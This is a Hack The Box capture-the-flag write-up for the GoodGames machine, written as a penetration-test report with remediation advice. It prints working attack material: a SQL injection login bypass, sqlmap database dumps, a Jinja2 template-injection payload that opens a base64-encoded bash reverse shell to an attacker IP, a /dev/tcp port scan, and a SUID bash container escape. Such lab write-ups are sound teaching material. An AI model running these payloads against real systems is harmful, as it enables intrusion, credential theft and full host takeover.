# GoodGames (HTB) — CEH-Style Penetration Test Report

## 1) Executive Summary

Target: `goodgames.htb` (Hack The Box).
Outcome: Full system compromise. Initial foothold via SQL Injection on the login form; privilege escalation through Jinja2 SSTI to container RCE; host pivot over Docker bridge; root compromise via SUID abuse on bind-mounted user home.&#x20;

---

## 2) Scope & ROE

* In-scope host: `10.129.87.9`, vhost `goodgames.htb` (per HTB challenge).
* Allowed techniques: Web enumeration, injection attacks, local privilege escalation within challenge boundaries.
* No out-of-scope targets or destructive testing performed.&#x20;

---

## 3) Methodology (Mapped to CEH Phases)

### 3.1 Reconnaissance

**Objective:** Identify exposed services and web entry points.

**Nmap (TCP connect + version):**

```bash
nmap -sV -sT 10.129.87.9
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-20 20:23 EEST
Nmap scan report for 10.129.87.9
Host is up (0.13s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
Service Info: Host: goodgames.htb
```

Finding: HTTP on 80 (Apache 2.4.51).&#x20;

---

### 3.2 Scanning & Enumeration

**Objective:** Discover web paths and identify vulnerabilities.

**Directory brute-force (Gobuster) & custom 404 handling:**
Initial error indicated the server returns `200` on non-existing paths (custom 404). We excluded by content length `9265` to filter noise.

```bash
gobuster dir -u http://goodgames.htb/ -w SecLists-master/Discovery/Web-Content/common.txt 
...
Error: the server returns a status code ... => 200 (Length: 9265). To continue please exclude the status code or the length
```

**Mitigation of noisy 200s:**

```bash
gobuster dir -u http://goodgames.htb/ \
  -w SecLists-master/Discovery/Web-Content/common.txt \
  --exclude-length 9265
```

**Results:**

```bash
/blog                 (Status: 200) [Size: 44212]
/forgot-password      (Status: 200) [Size: 32744]
/login                (Status: 200) [Size: 9294]
/logout               (Status: 302) [--> http://goodgames.htb/]
/profile              (Status: 200) [Size: 9267]
/server-status        (Status: 403) [Size: 278]
/signup               (Status: 200) [Size: 33387]
```

Key paths discovered: `/login`, `/profile`, `/signup`.&#x20;

---

### 3.3 Gaining Access (Exploitation)

**Objective:** Obtain authenticated access and remote code execution.

#### 3.3.1 SQL Injection (Login form)

Manual test via Burp (Raw request):

```bash
POST /login HTTP/1.1
Host: goodgames.htb
Content-Length: 49
Cache-Control: max-age=0
Origin: http://goodgames.htb
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 ...
Connection: keep-alive

email=admin' or 1 = 1 -- -&password=test123456789
```

Response indicated login success:

```bash
HTTP/1.1 200 OK
...
<title>GoodGames | Login Success</title>
```

Automated verification & exploitation with `sqlmap`:

```bash
sqlmap -r goodgame.req
...
POST parameter 'email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
...
Title: Generic UNION query (NULL) - 4 columns
...
the back-end DBMS is MySQL
```

**DB enumeration:**

```bash
sqlmap -r goodgame.req --dbs
available databases [2]:
[*] information_schema
[*] main
```

**Tables & dump:**

```bash
sqlmap -r goodgame.req -D main --tables
Database: main
[3 tables]
+---------------+
| user          |
| blog          |
| blog_comments |
+---------------+

sqlmap -r goodgame.req -D main -T user --dump
Database: main
Table: user
[2 entries]
+----+---------------------+--------+----------------------------------+
| id | email               | name   | password                         |
+----+---------------------+--------+----------------------------------+
| 1  | admin@goodgames.htb | admin  | 2b22337f218b2d82dfc3b6f77e7cb8ec |
| 2  | test@test.com       | Test   | b5325989a9149a34e63e2939771ae9f7 |
+----+---------------------+--------+----------------------------------+
```

Observation: Admin creds are stored as hashes; path to further access through app features.&#x20;

#### 3.3.2 SSTI → RCE (Flask/Jinja2)

We identified a profile update form reflecting input. Testing SSTI:

```
{{7*7}}
```

Displayed `49` — Jinja2 evaluation confirmed.

Reverse shell via base64-encoded payload (bypassing special chars/filters):

```bash
echo -ne 'bash -i >& /dev/tcp/10.10.16.46/4444 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40Ni80NDQ0IDA+JjE=

{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40Ni80NDQ0IDA+JjE==${IFS}|base64${IFS}-d|bash').read()}}
```

Listener & shell:

```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.113.24 54028
root@3a453ab39d3d:/backend#
```

Foothold obtained inside a Docker container as root. First user flag located under `/home/augustus/user.txt`.&#x20;

---

### 3.4 Post-Exploitation & Pivoting

**Objective:** Escape container context and compromise the host.

**Mount reconnaissance & network layout:**

```bash
/dev/sda1 on /home/augustus type ext4 (rw,...)
...
ifconfig
eth0 ... inet 172.19.0.2/16
```

Typical Docker bridge infers host at `172.19.0.1`.

**Host port scan without nmap (Bash `/dev/tcp`):**

```bash
for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT
&>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
```

Discovered open `22/tcp` and `80/tcp` on host.&#x20;

**SSH to host using known creds:**

```bash
ssh augustus@172.19.0.1
augustus@172.19.0.1's password: superadministrator
Linux GoodGames ...
augustus@GoodGames:~$
```

Now on the host as user `augustus`. `sudo -l` not helpful.&#x20;

---

### 3.5 Privilege Escalation (Host → root)

**Technique:** Abuse bind-mounted home directory from within the container to set SUID root on a copied `bash`, then execute it on the host.

From **container** (where `/home/augustus` is bind-mounted):

```bash
cd /home/augustus
ls -ls
# Copy bash into the mounted dir, then:
chown root:root bash
chmod 4755 bash
```

Back on **host**:

```bash
ssh augustus@172.19.0.1
ls -la
-rwsr-xr-x 1 root root 1234376 Aug 22 20:40 bash
./bash -p
id
uid=1000(augustus) gid=1000(augustus) euid=0(root) groups=1000(augustus)
cd /root && ls -la
... root.txt
```

Root shell obtained; root flag accessible.&#x20;

---

### 3.6 Maintaining Access (Not pursued)

In real engagements, we would consider persistence (e.g., authorized\_keys, systemd services). Not performed here to honor CTF constraints.

### 3.7 Clearing Tracks (Not pursued)

No log tampering executed (CTF environment).

---

## 4) Findings & Impact

1. **SQL Injection (Critical)**

   * Location: `/login` (`email` POST param).
   * Evidence: `sqlmap` confirmed time-based blind and UNION-based injection; DB enumeration and user dump performed.
   * Impact: Credential/PII disclosure; full app compromise path.&#x20;

2. **Server-Side Template Injection → Remote Code Execution (Critical)**

   * Location: Profile update form (Flask/Jinja2).
   * Evidence: `{{7*7}}` → `49`; os execution via `popen`; reverse shell established.
   * Impact: Container-level root command execution.&#x20;

3. **Container-to-Host Escape via Bind Mount Misuse (High)**

   * Condition: Host user home bind-mounted into container writable context.
   * Evidence: Setting SUID root on `bash` inside mount reflected on host; root shell via `bash -p`.
   * Impact: Full host compromise from compromised container.&#x20;

---

## 5) Recommendations

**For SQL Injection**

* Enforce parameterized queries/ORM bindings (no string concatenation).
* Apply strict server-side input validation and encoding.
* Implement centralized error handling to avoid leaking DB details.
* Add WAF rules for common SQLi patterns; rate-limit auth endpoints.&#x20;

**For SSTI (Jinja2/Flask)**

* Never render user-controlled data directly into templates. Use safe contexts and explicit whitelists.
* Consider `jinja2.StrictUndefined`, sandboxing, and robust template autoescaping.
* Perform server-side validation and output encoding; consider filtering dangerous constructs (`__class__`, `__mro__`, `__subclasses__`, `self`, `globals`, etc.).&#x20;

**For Docker/Host Isolation**

* Avoid bind-mounting sensitive host paths with write permissions into containers.
* Run containers with least privilege, drop capabilities, and enforce read-only FS where possible.
* Use separate unprivileged users inside containers; enable user namespaces.
* Do not expose Docker API (`:2375`) unauthenticated; restrict bridge networks; firewall host bridge IPs.&#x20;

**General**

* Deploy secrets management; rotate any credentials found during this test.
* Centralized logging/monitoring and alerting for anomalous web and container activity.&#x20;

---

## 6) Appendix — Full Command/Output Snippets

### 6.1 Gobuster false-positive handling and results

```bash
gobuster dir -u http://goodgames.htb/ -w SecLists-master/Discovery/Web-Content/common.txt 
...
--exclude-length 9265
...
/blog
/forgot-password
/login
/logout
/profile
/server-status
/signup
```

### 6.2 Burp raw SQLi attempt & server response

```bash
POST /login HTTP/1.1
...
email=admin' or 1 = 1 -- -&password=test123456789
```

```bash
HTTP/1.1 200 OK
<title>GoodGames | Login Success</title>
```

### 6.3 Sqlmap evidence of injection, DBs, tables, dump

```bash
sqlmap -r goodgame.req
...
the back-end DBMS is MySQL
```

```bash
sqlmap -r goodgame.req --dbs
[*] information_schema
[*] main
```

```bash
sqlmap -r goodgame.req -D main -T user --dump
[2 entries]
+----+---------------------+--------+----------------------------------+
| 1  | admin@goodgames.htb | admin  | 2b22337f218b2d82dfc3b6f77e7cb8ec |
| 2  | test@test.com       | Test   | b5325989a9149a34e63e2939771ae9f7 |
+----+---------------------+--------+----------------------------------+
```

### 6.4 SSTI test & reverse shell

```
{{7*7}}  → 49
```

```bash
echo -ne 'bash -i >& /dev/tcp/10.10.16.46/4444 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40Ni80NDQ0IDA+JjE=
```

```jinja
{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40Ni80NDQ0IDA+JjE==${IFS}|base64${IFS}-d|bash').read()}}
```

```bash
nc -lvnp 4444
Connection received ...
root@3a453ab39d3d:/backend#
```

### 6.5 Container → host pivot and PE

```bash
ifconfig
# eth0: 172.19.0.2/16  → host likely 172.19.0.1
```

```bash
for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT
&>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
# Open: 22, 80
```

```bash
ssh augustus@172.19.0.1
# password: superadministrator
```

```bash
# from container (bind mount abuse)
cd /home/augustus
chown root:root bash
chmod 4755 bash
```

```bash
# back on host
./bash -p
id
uid=1000(augustus) gid=1000(augustus) euid=0(root)
cd /root && ls -la
# root.txt
```

All snippets above are taken from the engagement transcript and preserved verbatim.&#x20;

---

### 7) Conclusion

This engagement demonstrates a classic modern kill-chain in web + containerized environments:

* **Web tier**: SQLi → data exposure and auth bypass.
* **App tier**: SSTI → code execution inside a container.
* **Infra tier**: Weak container/host boundary (bind mounts) → root on host.

Closing these three classes of issues (input handling, template safety, container hardening) would have prevented compromise at multiple points.&#x20;
